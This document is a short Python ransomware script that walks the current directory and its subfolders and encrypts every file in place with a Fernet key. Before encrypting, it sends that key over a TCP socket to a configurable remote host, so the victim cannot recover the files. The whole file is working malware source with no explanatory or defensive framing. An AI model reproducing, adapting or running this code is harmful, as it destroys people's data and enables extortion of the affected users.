from cryptography.fernet import Fernet
import os
import socket

host = ""   #Change this
port = 19114                #Change this

def files_list():
    allfiles = os.listdir(".")
    files = []
    for i in allfiles:
        if i == 'ransom.py' or i == 'decrypt.py' or i == 'filekey.key':
            pass
        else:
            files.append(i)
    return files

files = files_list()

key = Fernet.generate_key()

send_key = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
send_key.connect((host,port))
send_key.sendall(key)
send_key.close()

fernet = Fernet(key)

def ransom(files):
    for file in files:
        try:
            if os.path.isfile(file):
                with open(file,'rb') as targetfile:
                    data = targetfile.read()
                data = fernet.encrypt(data)
                with open(file, 'wb') as targetfile:
                    targetfile.write(data)
            else:
                os.chdir(file)
                newfiles = files_list()
                ransom(newfiles)
        except FileNotFoundError:
            ransomedfile = os.path.basename(os.getcwd())
            os.chdir("..")
            newfiles = files_list()
            newfiles.remove(ransomedfile)
            ransom(newfiles)

ransom(files)
